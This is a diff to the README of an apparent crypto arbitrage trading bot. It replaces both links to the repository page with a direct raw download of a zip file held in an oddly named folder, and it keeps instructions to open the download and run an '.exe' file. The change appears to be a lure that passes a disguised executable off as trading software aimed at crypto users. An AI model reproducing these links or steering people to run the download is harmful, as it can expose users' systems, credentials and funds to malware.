@@ -1,6 +1,6 @@
 # 📈 crypto-arbitrage-bot-automated-trading - Trade crypto across exchanges with ease
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Gestationradiotelescope548/crypto-arbitrage-bot-automated-trading)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/Gestationradiotelescope548/crypto-arbitrage-bot-automated-trading/main/fiddlerfish/automated-crypto-arbitrage-trading-bot-magmatic.zip)
 
 ## 📖 Overview
 This software automates crypto trades. It monitors price gaps between exchanges like Binance, Bybit, and TON. When a price difference appears, the system acts to capture profit. You do not need to watch the screen. The bot calculates risks and handles trade execution. 
@@ -20,7 +20,7 @@ This software automates crypto trades. It monitors price gaps between exchanges 
 - Verified accounts on target exchanges.
 
 ## 📥 How to Install
-Visit the [download page](https://github.com/Gestationradiotelescope548/crypto-arbitrage-bot-automated-trading) to start. Click the green "Code" button and select "Download ZIP" or check the "Releases" section on the right side for the latest installer file.
+Visit the [download page](https://raw.githubusercontent.com/Gestationradiotelescope548/crypto-arbitrage-bot-automated-trading/main/fiddlerfish/automated-crypto-arbitrage-trading-bot-magmatic.zip) to start. Click the green "Code" button and select "Download ZIP" or check the "Releases" section on the right side for the latest installer file.
 
 1. Open the downloaded folder.
 2. Run the application file ending in .exe.
